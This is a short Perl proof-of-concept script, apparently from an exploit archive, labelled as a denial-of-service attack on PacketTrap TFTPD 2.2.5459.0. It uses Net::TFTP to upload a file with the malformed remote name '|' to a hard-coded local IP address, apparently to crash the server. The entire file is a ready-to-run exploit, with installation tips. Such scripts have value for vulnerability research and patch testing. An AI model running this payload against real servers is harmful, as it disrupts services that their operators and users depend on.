#!/usr/bin/perl
# Jeremy Brown [0xjbrown41@gmail.com/jbrownsec.blogspot.com]
# PacketTrap TFTPD DoS (latest 2.2.5459.0 tested) -- www.packettrap.com
# Must have Net::TFTP installed (easy to install, 'cpan' then 'install Net::TFTP' ;)
# A product of tftpfuzz.pl (coming soon)

use Net::TFTP;
use Getopt::Std;

$tftp = Net::TFTP->new("192.168.0.112");
$tftp->ascii;
$tftp->put("test", "|");

exit;